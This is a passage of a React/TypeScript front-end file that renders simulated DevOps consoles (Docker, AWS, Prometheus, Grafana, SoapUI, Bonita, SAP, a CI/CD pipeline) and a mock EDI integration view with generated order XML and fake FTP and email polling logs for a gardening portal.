                        <p className="text-xs text-slate-500">{container.image}</p>
                      </div>
                    </div>
                    <div className="flex gap-8 text-xs">
                      <div>
                        <p className="text-slate-400 uppercase font-bold text-[10px]">Status</p>
                        <span className={cn("font-medium", container.status === 'Running' ? "text-green-600" : "text-slate-500")}>{container.status}</span>
                      </div>
                      <div>
                        <p className="text-slate-400 uppercase font-bold text-[10px]">Ports</p>
                        <span className="font-mono">{container.ports}</span>
                      </div>
                      <div>
                        <p className="text-slate-400 uppercase font-bold text-[10px]">CPU/MEM</p>
                        <span className="font-mono">{container.cpu} / {container.mem}</span>
                      </div>
                    </div>
                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={() => setSelectedContainerLogs(container.name)}>Logs</Button>
                      <Button variant="outline" size="sm" className="text-red-600 hover:text-red-700">Stop</Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            <AnimatePresence>
              {selectedContainerLogs && (
                <motion.div 
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-slate-900/60 backdrop-blur-sm"
                  onClick={() => setSelectedContainerLogs(null)}
                >
                  <Card className="w-full max-w-2xl bg-slate-950 text-slate-300 rounded-3xl overflow-hidden border-slate-800 shadow-2xl" onClick={e => e.stopPropagation()}>
                    <CardHeader className="border-b border-slate-800 flex flex-row items-center justify-between p-6">
                      <CardTitle className="text-lg flex items-center gap-2">
                        <TerminalIcon className="w-5 h-5 text-blue-400" />
                        Logs: {selectedContainerLogs}
                      </CardTitle>
                      <Button variant="ghost" size="icon" onClick={() => setSelectedContainerLogs(null)} className="text-slate-400 hover:text-white">
                        <XCircle className="w-6 h-6" />
                      </Button>
                    </CardHeader>
                    <CardContent className="p-6 font-mono text-xs h-96 overflow-auto space-y-1">
                      {containerLogs[selectedContainerLogs]?.map((log, i) => (
                        <p key={i} className="hover:bg-slate-900 px-2 py-0.5 rounded">
                          <span className="text-slate-500 mr-2">[{i+1}]</span>
                          {log}
                        </p>
                      ))}
                    </CardContent>
                  </Card>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        );
      case 'aws':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">AWS Management Console (Simulated)</h3>
              <Badge className="bg-orange-500">Region: us-east-1</Badge>
            </div>
            
            <div className="grid grid-cols-3 gap-6">
              {/* EC2 Section */}
              <Card className="col-span-2">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Server className="w-4 h-4 text-orange-500" />
                    EC2 Instances
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <table className="w-full text-xs">
                    <thead>
                      <tr className="text-slate-400 border-b">
                        <th className="text-left pb-2">Instance ID</th>
                        <th className="text-left pb-2">Type</th>
                        <th className="text-left pb-2">State</th>
                        <th className="text-left pb-2">Public IP</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y">
                      <tr>
                        <td className="py-3 font-mono text-blue-600">i-0a123bc456def</td>
                        <td>t3.medium</td>
                        <td><Badge className="bg-green-500 text-[10px] h-5">running</Badge></td>
                        <td className="font-mono">54.12.89.21</td>
                      </tr>
                      <tr>
                        <td className="py-3 font-mono text-blue-600">i-0f987gh654ijk</td>
                        <td>m5.large</td>
                        <td><Badge className="bg-green-500 text-[10px] h-5">running</Badge></td>
                        <td className="font-mono">3.214.55.102</td>
                      </tr>
                    </tbody>
                  </table>
                </CardContent>
              </Card>

              {/* S3 Section */}
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <HardDrive className="w-4 h-4 text-orange-500" />
                    S3 Buckets
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium">prod-assets-static</span>
                    <Badge variant="outline" className="text-[10px]">Private</Badge>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-medium">user-uploads-raw</span>
                    <Badge variant="outline" className="text-[10px]">Private</Badge>
                  </div>
                </CardContent>
              </Card>

              {/* IAM Section - Football Managers */}
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Shield className="w-4 h-4 text-orange-500" />
                    IAM Users
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  {[
                    { name: 'jose.mourinho', role: 'Administrator' },
                    { name: 'pep.guardiola', role: 'Architect' },
                    { name: 'carlo.ancelotti', role: 'Operator' },
                    { name: 'jurgen.klopp', role: 'Developer' },
                  ].map((user) => (
                    <div key={user.name} className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <User className="w-3 h-3 text-slate-400" />
                        <span className="text-xs font-medium">{user.name}</span>
                      </div>
                      <span className="text-[10px] text-slate-500">{user.role}</span>
                    </div>
                  ))}
                </CardContent>
              </Card>

              {/* VPC & Networking Section */}
              <Card className="col-span-1">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Network className="w-4 h-4 text-orange-500" />
                    VPC & Networking
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="p-2 bg-slate-50 rounded-lg border border-slate-100">
                    <p className="text-[10px] font-bold text-slate-400 uppercase mb-1">VPC</p>
                    <p className="text-xs font-mono">vpc-0a1b2c3d (10.0.0.0/16)</p>
                  </div>
                  <div className="p-2 bg-slate-50 rounded-lg border border-slate-100">
                    <p className="text-[10px] font-bold text-slate-400 uppercase mb-1">Internet Gateway</p>
                    <p className="text-xs font-mono">igw-0f9e8d7c (Attached)</p>
                  </div>
                </CardContent>
              </Card>

              {/* CloudWatch Section */}
              <Card className="col-span-1">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Activity className="w-4 h-4 text-orange-500" />
                    CloudWatch Alarms
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div className="flex items-center gap-2 text-xs text-green-600 bg-green-50 p-2 rounded-lg border border-green-100">
                    <CheckCircle2 className="w-3 h-3" />
                    <span>CPU_Utilization_High: OK</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-yellow-600 bg-yellow-50 p-2 rounded-lg border border-yellow-100">
                    <AlertTriangle className="w-3 h-3" />
                    <span>Status_Check_Failed: ALARM</span>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        );
      case 'prometheus':
        return (
          <div className="space-y-6">
            <h3 className="text-lg font-bold">Prometheus Query Browser</h3>
            <div className="flex gap-2">
              <div className="flex-1 relative">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
                <input 
                  className="w-full h-10 rounded-md border border-slate-200 bg-white px-10 py-2 text-sm ring-offset-white file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-slate-500 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-slate-950 focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 font-mono" 
                  placeholder="Expression (e.g. rate(http_requests_total[5m]))" 
                  defaultValue="node_cpu_seconds_total{mode='idle'}" 
                />
              </div>
              <Button className="bg-orange-600 hover:bg-orange-700">Execute</Button>
            </div>
            <Card className="h-80 p-4 bg-white border-2 border-slate-100">
              <div className="h-full w-full">
                <ResponsiveContainer width="100%" height="100%">
                  <LineChart data={prometheusData}>
                    <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="#f1f5f9" />
                    <XAxis 
                      dataKey="time" 
                      fontSize={10} 
                      tickLine={false} 
                      axisLine={false} 
                      tick={{ fill: '#94a3b8' }}
                    />
                    <YAxis 
                      fontSize={10} 
                      tickLine={false} 
                      axisLine={false} 
                      tick={{ fill: '#94a3b8' }}
                    />
                    <RechartsTooltip 
                      contentStyle={{ backgroundColor: '#fff', borderRadius: '8px', border: '1px solid #e2e8f0', fontSize: '12px' }}
                    />
                    <Line 
                      type="monotone" 
                      dataKey="value" 
                      stroke="#ea580c" 
                      strokeWidth={2} 
                      dot={{ r: 4, fill: '#ea580c', strokeWidth: 0 }} 
                      activeDot={{ r: 6, strokeWidth: 0 }}
                    />
                  </LineChart>
                </ResponsiveContainer>
              </div>
            </Card>
            <div className="flex justify-between items-center text-[10px] text-slate-400 font-mono px-2">
              <p>Query returned 1 series in 12ms</p>
              <p>Showing last 45 minutes</p>
            </div>
          </div>
        );
      case 'grafana':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">Grafana Dashboard: System Overview</h3>
              <div className="flex gap-2">
                <Badge variant="outline">Last 6 hours</Badge>
                <RefreshCw className="w-4 h-4 text-slate-400" />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-6">
              <Card className="h-48 bg-slate-900 border-slate-800 flex items-center justify-center">
                <div className="text-center">
                  <p className="text-xs text-slate-500 uppercase font-bold mb-2">Request Latency (P99)</p>
                  <span className="text-4xl font-bold text-green-400">124ms</span>
                </div>
              </Card>
              <Card className="h-48 bg-slate-900 border-slate-800 flex items-center justify-center">
                <div className="text-center">
                  <p className="text-xs text-slate-500 uppercase font-bold mb-2">Error Rate</p>
                  <span className="text-4xl font-bold text-red-400">0.02%</span>
                </div>
              </Card>
              <Card className="col-span-2 h-80 bg-slate-900 border-slate-800 p-6">
                <div className="flex justify-between mb-6">
                  <div>
                    <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider">Traffic Volume (Requests/sec)</h4>
                    <p className="text-[10px] text-slate-500 mt-1">Real-time throughput across all clusters</p>
                  </div>
                  <div className="flex gap-4">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-blue-500 rounded-full" />
                      <span className="text-[10px] text-slate-400">Success</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-red-500 rounded-full" />
                      <span className="text-[10px] text-slate-400">Error</span>
                    </div>
                  </div>
                </div>
                <div className="h-56 w-full">
                  <ResponsiveContainer width="100%" height="100%">
                    <AreaChart data={grafanaTrafficData}>
                      <defs>
                        <linearGradient id="colorSuccess" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.3}/>
                          <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                        </linearGradient>
                        <linearGradient id="colorError" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#ef4444" stopOpacity={0.3}/>
                          <stop offset="95%" stopColor="#ef4444" stopOpacity={0}/>
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" vertical={false} stroke="#1e293b" />
                      <XAxis 
                        dataKey="time" 
                        fontSize={10} 
                        tickLine={false} 
                        axisLine={false} 
                        tick={{ fill: '#475569' }}
                      />
                      <YAxis 
                        fontSize={10} 
                        tickLine={false} 
                        axisLine={false} 
                        tick={{ fill: '#475569' }}
                      />
                      <RechartsTooltip 
                        contentStyle={{ backgroundColor: '#0f172a', borderRadius: '8px', border: '1px solid #1e293b', fontSize: '12px', color: '#fff' }}
                        itemStyle={{ color: '#fff' }}
                      />
                      <Area 
                        type="monotone" 
                        dataKey="success" 
                        stroke="#3b82f6" 
                        fillOpacity={1} 
                        fill="url(#colorSuccess)" 
                        strokeWidth={2}
                      />
                      <Area 
                        type="monotone" 
                        dataKey="error" 
                        stroke="#ef4444" 
                        fillOpacity={1} 
                        fill="url(#colorError)" 
                        strokeWidth={2}
                      />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>
              </Card>
            </div>
          </div>
        );
      case 'soapui':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">Soap UI - Web Service Tester</h3>
              <div className="flex gap-2">
                <Badge className="bg-blue-600">WSDL: http://jardinagem.portal/services?wsdl</Badge>
                <Button size="sm" className="bg-green-600 hover:bg-green-700">
                  <Play className="w-4 h-4 mr-2" /> Send Request
                </Button>
              </div>
            </div>
            <div className="grid grid-cols-2 gap-6">
              <div className="space-y-2">
                <p className="text-xs font-bold text-slate-400 uppercase">Request XML</p>
                <textarea 
                  value={soapRequest}
                  onChange={(e) => setSoapRequest(e.target.value)}
                  className="w-full h-96 bg-slate-900 text-slate-300 p-6 rounded-2xl font-mono text-xs border-none focus:ring-2 focus:ring-blue-500 outline-none resize-none"
                />
              </div>
              <div className="space-y-2">
                <p className="text-xs font-bold text-slate-400 uppercase">Response XML</p>
                <div className="w-full h-96 bg-slate-950 text-green-500 p-6 rounded-2xl font-mono text-xs overflow-auto">
                  <p className="text-slate-500">HTTP/1.1 200 OK</p>
                  <p className="text-slate-500">Content-Type: text/xml;charset=UTF-8</p>
                  <p className="mt-4">{"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">"}</p>
                  <p>{"   <soapenv:Body>"}</p>
                  <p>{"      <gar:GetInventoryResponse xmlns:gar=\"http://jardinagem.portal/services\">"}</p>
                  <p className="text-blue-400">{"         <gar:Inventory>"}</p>
                  <p className="text-blue-400">{"            <gar:Supplier>Nebula Brew Corp</gar:Supplier>"}</p>
                  <p className="text-blue-400">{"            <gar:Item id=\"1\">"}</p>
                  <p className="text-blue-400">{"               <gar:Name>Samambaia Real</gar:Name>"}</p>
                  <p className="text-blue-400">{"               <gar:Stock>45</gar:Stock>"}</p>
                  <p className="text-blue-400">{"            </gar:Item>"}</p>
                  <p className="text-blue-400">{"            <gar:Item id=\"2\">"}</p>
                  <p className="text-blue-400">{"               <gar:Name>Orquídea Azul</gar:Name>"}</p>
                  <p className="text-blue-400">{"               <gar:Stock>12</gar:Stock>"}</p>
                  <p className="text-blue-400">{"            </gar:Item>"}</p>
                  <p className="text-blue-400">{"         </gar:Inventory>"}</p>
                  <p>{"      </gar:GetInventoryResponse>"}</p>
                  <p>{"   </soapenv:Body>"}</p>
                  <p>{"</soapenv:Envelope>"}</p>
                </div>
              </div>
            </div>
          </div>
        );
      case 'bonita':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-bold">Bonita BPM - Process Management</h3>
              <Button size="sm" className="bg-green-600 hover:bg-green-700">
                <Plus className="w-4 h-4 mr-2" /> New Case
              </Button>
            </div>
            <div className="grid grid-cols-3 gap-6">
              <Card className="col-span-1">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm">Active Processes</CardTitle>
                </CardHeader>
                <CardContent className="space-y-2">
                  {[
                    { name: 'Order Fulfillment', version: '1.2.0', status: 'Enabled' },
                    { name: 'Supplier Onboarding', version: '2.0.1', status: 'Enabled' },
                    { name: 'Inventory Audit', version: '0.9.5', status: 'Draft' },
                  ].map((proc) => (
                    <div key={proc.name} className="p-3 bg-slate-50 rounded-lg border border-slate-100 hover:border-green-300 cursor-pointer transition-colors">
                      <div className="flex justify-between items-start">
                        <span className="text-sm font-bold">{proc.name}</span>
                        <Badge variant="outline" className="text-[10px]">{proc.version}</Badge>
                      </div>
                      <span className="text-[10px] text-green-600 font-bold uppercase">{proc.status}</span>
                    </div>
                  ))}
                </CardContent>
              </Card>
              <Card className="col-span-2">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm">Process Simulation: Order Fulfillment</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="relative h-64 border-2 border-dashed border-slate-200 rounded-2xl flex items-center justify-center overflow-hidden bg-slate-50">
                    <div className="flex items-center gap-8">
                      <div className="w-24 h-16 bg-white border-2 border-green-500 rounded-lg flex items-center justify-center text-[10px] font-bold text-center p-1 shadow-sm">Start Order</div>
                      <ArrowRight className="w-4 h-4 text-slate-400" />
                      <div className="w-24 h-16 bg-green-100 border-2 border-green-500 rounded-lg flex items-center justify-center text-[10px] font-bold text-center p-1 shadow-sm animate-pulse">Check Stock</div>
                      <ArrowRight className="w-4 h-4 text-slate-400" />
                      <div className="w-24 h-16 bg-white border-2 border-slate-300 rounded-lg flex items-center justify-center text-[10px] font-bold text-center p-1 shadow-sm opacity-50">Shipment</div>
                    </div>
                    <div className="absolute bottom-4 left-4 text-[10px] text-slate-400 font-mono">
                      Tracing case ID: #FUL-8829...
                    </div>
                  </div>
                  <div className="mt-4 space-y-2">
                    <p className="text-xs font-bold text-slate-500 uppercase">Current Tasks</p>
                    <div className="flex items-center justify-between p-2 bg-white border rounded-lg text-xs">
                      <span>Validate Inventory (Manual Task)</span>
                      <Button size="sm" className="h-6 text-[10px]">Execute</Button>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        );
      case 'sap':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-4">
                <div className="w-10 h-10 bg-blue-800 rounded flex items-center justify-center text-white font-bold text-xl italic">SAP</div>
                <h3 className="text-lg font-bold">SAP Easy Access - Portal Integration</h3>
              </div>
              <div className="flex gap-2">
                <div className="flex items-center bg-slate-100 rounded px-2 border">
                  <span className="text-[10px] font-bold text-slate-400 mr-2">T-Code:</span>
                  <input 
                    value={sapTransaction}
                    onChange={(e) => setSapTransaction(e.target.value)}
                    className="bg-transparent border-none outline-none font-mono text-sm w-16"
                  />
                </div>
                <Button size="sm" className="bg-blue-800 hover:bg-blue-900">Execute</Button>
              </div>
            </div>
            <Card className="border-2 border-blue-200 shadow-lg overflow-hidden">
              <div className="bg-slate-200 px-4 py-1 border-b border-slate-300 flex items-center gap-4 text-[10px] font-bold text-slate-600">
                <span>Menu</span>
                <span>Edit</span>
                <span>Favorites</span>
                <span>Extras</span>
                <span>System</span>
                <span>Help</span>
              </div>
              <div className="p-6 bg-slate-50 min-h-[400px]">
                {sapTransaction.toUpperCase() === 'MM03' ? (
                  <div className="space-y-6">
                    <div className="flex items-center gap-2 border-b-2 border-blue-800 pb-2">
                      <h4 className="font-bold text-blue-900">Display Material (Initial Screen)</h4>
                    </div>
                    <div className="grid grid-cols-2 gap-8">
                      <div className="space-y-4">
                        <div className="flex items-center gap-4">
                          <label className="text-xs font-bold w-24">Material:</label>
                          <input className="border border-slate-300 bg-white px-2 py-1 text-xs w-48 font-mono" defaultValue="PLANT-001" />
                        </div>
                        <div className="flex items-center gap-4">
                          <label className="text-xs font-bold w-24">Industry Sector:</label>
                          <input className="border border-slate-300 bg-white px-2 py-1 text-xs w-48" defaultValue="Retail" />
                        </div>
                        <div className="flex items-center gap-4">
                          <label className="text-xs font-bold w-24">Material Type:</label>
                          <input className="border border-slate-300 bg-white px-2 py-1 text-xs w-48" defaultValue="Trading Goods" />
                        </div>
                      </div>
                      <Card className="bg-blue-50 border-blue-100 p-4">
                        <h5 className="text-[10px] font-bold text-blue-800 uppercase mb-2">Material Info</h5>
                        <p className="text-xs">Description: Samambaia Real (Large)</p>
                        <p className="text-xs">Base Unit: PC</p>
                        <p className="text-xs">Supplier: Vortex Coffee Systems</p>
                        <p className="text-xs">Material Group: GARDEN_01</p>
                      </Card>
                    </div>
                    <div className="mt-8">
                      <table className="w-full text-[10px] border-collapse">
                        <thead>
                          <tr className="bg-slate-200 border">
                            <th className="p-1 border text-left">Plant</th>
                            <th className="p-1 border text-left">Storage Loc</th>
                            <th className="p-1 border text-left">Unrestricted</th>
                            <th className="p-1 border text-left">Value</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr className="bg-white border">
                            <td className="p-1 border">1000 (Lisboa)</td>
                            <td className="p-1 border">0001</td>
                            <td className="p-1 border text-green-600 font-bold">45.000</td>
                            <td className="p-1 border">1.125,00 EUR</td>
                          </tr>
                          <tr className="bg-white border">
                            <td className="p-1 border">2000 (Porto)</td>
                            <td className="p-1 border">0001</td>
                            <td className="p-1 border text-green-600 font-bold">12.000</td>
                            <td className="p-1 border">300,00 EUR</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  </div>
                ) : (
                  <div className="flex items-center justify-center h-full text-slate-400 flex-col gap-4 py-20">
                    <Search className="w-12 h-12 opacity-20" />
                    <p>Transaction {sapTransaction} not simulated in this demo.</p>
                    <p className="text-[10px]">Try 'MM03' for Material Display.</p>
                  </div>
                )}
              </div>
              <div className="bg-slate-200 px-4 py-1 border-t border-slate-300 text-[10px] text-slate-500 font-mono flex justify-between">
                <span>PRD (100) / SAPGUI 7.70</span>
                <span>INS / OVR / CAP</span>
              </div>
            </Card>
          </div>
        );
      case 'pipeline':
        return (
          <div className="space-y-8">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-4">
                <div className="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center text-white shadow-lg">
                  <RefreshCw className={cn("w-10 h-10", pipelineStatus === 'running' && "animate-spin")} />
                </div>
                <div>
                  <h3 className="text-2xl font-black">Infrastructure CI/CD Pipeline</h3>
                  <p className="text-slate-500 text-sm">Automated deployment for Portal de Jardinagem</p>
                </div>
              </div>
              <Button 
                onClick={handleRunPipeline}
                disabled={pipelineStatus === 'running'}
                className="bg-blue-600 hover:bg-blue-700 text-white rounded-xl px-8 h-12 font-bold shadow-lg shadow-blue-100"
              >
                {pipelineStatus === 'running' ? (
                  <>
                    <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                    Running...
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4 mr-2" />
                    Run Pipeline
                  </>
                )}
              </Button>
            </div>

            <div className="grid grid-cols-1 gap-4">
              {pipelineSteps.map((step, index) => (
                <Card key={step.id} className={cn(
                  "border-2 transition-all duration-500",
                  step.status === 'running' ? "border-blue-400 bg-blue-50/30 shadow-md" : 
                  step.status === 'success' ? "border-green-100 bg-green-50/20" : "border-slate-100"
                )}>
                  <CardContent className="p-4 flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      <div className={cn(
                        "w-8 h-8 rounded-full flex items-center justify-center font-bold text-xs",
                        step.status === 'success' ? "bg-green-500 text-white" :
                        step.status === 'running' ? "bg-blue-500 text-white animate-pulse" :
                        "bg-slate-200 text-slate-500"
                      )}>
                        {step.status === 'success' ? <CheckCircle2 className="w-5 h-5" /> : index + 1}
                      </div>
                      <div>
                        <p className={cn("font-bold", step.status === 'pending' ? "text-slate-400" : "text-slate-900")}>
                          {step.label}
                        </p>
                        {step.status === 'running' && (
                          <p className="text-[10px] text-blue-600 font-medium animate-pulse">In progress...</p>
                        )}
                      </div>
                    </div>
                    {step.logs.length > 0 && (
                      <div className="flex-1 ml-12 overflow-hidden">
                        <div className="bg-slate-900 rounded-lg p-3 font-mono text-[10px] text-slate-300 max-h-24 overflow-y-auto custom-scrollbar">
                          {step.logs.map((log, i) => (
                            <div key={i} className="flex gap-2">
                              <span className="text-slate-600 shrink-0">$</span>
                              <span>{log}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>
              ))}
            </div>

            {pipelineStatus === 'success' && (
              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="p-6 bg-green-50 border-2 border-green-200 rounded-3xl flex flex-col items-center text-center space-y-3"
              >
                <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center text-white">
                  <CheckCircle2 className="w-8 h-8" />
                </div>
                <div>
                  <h4 className="text-lg font-black text-green-900">Pipeline Finished Successfully</h4>
                  <p className="text-green-700 text-sm">All infrastructure components have been updated and verified.</p>
                </div>
              </motion.div>
            )}
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="flex h-full gap-8">
      {/* Tool Sidebar */}
      <div className="w-64 shrink-0 space-y-2 overflow-y-auto custom-scrollbar pr-2">
        <h2 className="text-xl font-bold mb-6">DevOps Tools</h2>
        {tools.map((tool) => (
          <button
            key={tool.id}
            onClick={() => setSelectedTool(tool.id)}
            className={cn(
              "w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all",
              selectedTool === tool.id 
                ? "bg-white shadow-md border border-slate-200" 
                : "hover:bg-slate-100 text-slate-600"
            )}
          >
            <div className={cn("p-2 rounded-lg", selectedTool === tool.id ? tool.bg : "bg-slate-200/50")}>
              <tool.icon className={cn("w-5 h-5", selectedTool === tool.id ? tool.color : "text-slate-500")} />
            </div>
            <span className={cn("font-bold text-sm", selectedTool === tool.id ? "text-slate-900" : "text-slate-600")}>
              {tool.label}
            </span>
            {selectedTool === tool.id && <ChevronRight className="ml-auto w-4 h-4 text-slate-400" />}
          </button>
        ))}
      </div>

      {/* Simulation Area */}
      <div className="flex-1 bg-white rounded-3xl border-2 border-slate-100 p-8 overflow-auto">
        <motion.div
          key={selectedTool}
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.2 }}
        >
          {renderSimulation()}
        </motion.div>
      </div>
    </div>
  );
};

const EDIIntegrationView = () => {
  const [activeTab, setActiveTab] = useState('map');
  const [selectedFile, setSelectedFile] = useState<{ name: string, content: string } | null>(null);
  const [ediFiles, setEdiFiles] = useState<Record<string, { name: string, size: string, content: string }[]>>({
    'Inqueue': [],
    'ftpExchange / outbox': [],
    'ftpExchange / inbox': []
  });

  const generateXML = (orderId: number, company: string) => {
    return `<?xml version="1.0" encoding="UTF-8"?>
<Order>
  <Header>
    <OrderID>ORD-${orderId}</OrderID>
    <Timestamp>${new Date().toISOString()}</Timestamp>
    <Partner>${company}</Partner>
  </Header>
  <Items>
    <Item>
      <SKU>COFFEE-BEANS-001</SKU>
      <Quantity>${Math.floor(Math.random() * 10) + 1}</Quantity>
      <Price>24.50</Price>
    </Item>
  </Items>
</Order>`;
  };

  const refreshFiles = () => {
    const baseId = Math.floor(Date.now() / 300000); // Changes every 5 mins
    const newFiles: Record<string, { name: string, size: string, content: string }[]> = {
      'Inqueue': [],
      'ftpExchange / outbox': [],
      'ftpExchange / inbox': []
    };

    ['Inqueue', 'ftpExchange / outbox', 'ftpExchange / inbox'].forEach(folder => {
      for (let i = 0; i < 5; i++) {
        const id = baseId + i;
        const company = portalCompanies[i % portalCompanies.length].nome;
        newFiles[folder].push({
          name: `order_${id}.xml`,
          size: `${((Math.random() * 2) + 1).toFixed(1)} KB`,
          content: generateXML(id, company)
        });
      }
    });
    setEdiFiles(newFiles);
  };

  useEffect(() => {
    refreshFiles();
    const interval = setInterval(refreshFiles, 300000); // 5 minutes
    return () => clearInterval(interval);
  }, []);

  const [logs, setLogs] = useState<string[]>([
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [EDI-SERVICE] JardimPartnerIntegration v2.4.0 starting...`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [EDI-SERVICE] Loading partner configurations from Oracle DB...`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [EDI-SERVICE] Successfully loaded 6 active partners.`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [POLLER] Starting scheduled polling cycle (Interval: 60s)...`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [DEBUG] [FTP-CLIENT] Connecting to Solar Beans Ltd FTP (ftp.solarbeans.pt:21)...`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [FTP-CLIENT] Connection established. Logged in as 'jardim_edi_user'.`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [DEBUG] [FTP-CLIENT] LIST /outbox`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [POLLER] Found 2 new files for Solar Beans Ltd.`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [EDI-SERVICE] Downloading order_9925.xml...`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [XML-PARSER] Validating order_9925.xml against schema XSD_v1.2...`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [DB-ADAPTER] Inserting order ORD-10025 into EDI_INBOUND_QUEUE...`,
    `[${new Date().toLocaleTimeString('pt-PT', { hour12: false })}] [INFO] [DB-ADAPTER] Transaction committed. Row ID: 0x9925AABBCC.`,
  ]);

  useEffect(() => {
    const interval = setInterval(() => {
      const timestamp = new Date().toLocaleTimeString('pt-PT', { hour12: false });
      const company = portalCompanies[Math.floor(Math.random() * portalCompanies.length)];
      const isEmail = ['Vortex Coffee Systems', 'Nebula Brew Corp'].includes(company.nome);
      
      const newLogs = isEmail ? [
        `[${timestamp}] [INFO] [SMTP-CLIENT] Checking POP3/IMAP for ${company.nome}...`,
        `[${timestamp}] [INFO] [SMTP-CLIENT] Found 1 new email with attachment.`,
        `[${timestamp}] [INFO] [EDI-SERVICE] Extracting order_xml_${Math.floor(Math.random() * 1000)}.xml from email...`,
        `[${timestamp}] [INFO] [DB-ADAPTER] Order successfully queued for processing.`
      ] : [
        `[${timestamp}] [DEBUG] [FTP-CLIENT] Connecting to ${company.nome} FTP...`,
        `[${timestamp}] [INFO] [FTP-CLIENT] LIST /outbox - Found 0 new files.`,
        `[${timestamp}] [DEBUG] [FTP-CLIENT] Disconnecting.`
      ];

      setLogs(prev => [...prev.slice(-40), ...newLogs]);
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  const companies = portalCompanies.map(c => ({
    name: c.nome,
    type: ['Vortex Coffee Systems', 'Nebula Brew Corp'].includes(c.nome) ? 'Email' : 'FTP',
    color: ['Vortex Coffee Systems', 'Nebula Brew Corp'].includes(c.nome) ? 'text-orange-500' : 'text-cyan-500',
    bg: ['Vortex Coffee Systems', 'Nebula Brew Corp'].includes(c.nome) ? 'bg-orange-50' : 'bg-cyan-50',
    border: ['Vortex Coffee Systems', 'Nebula Brew Corp'].includes(c.nome) ? 'border-orange-200' : 'border-cyan-200'
  }));

  return (
    <div className="h-full flex flex-col gap-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Integrações Externas: O Labirinto das EDIs</h1>
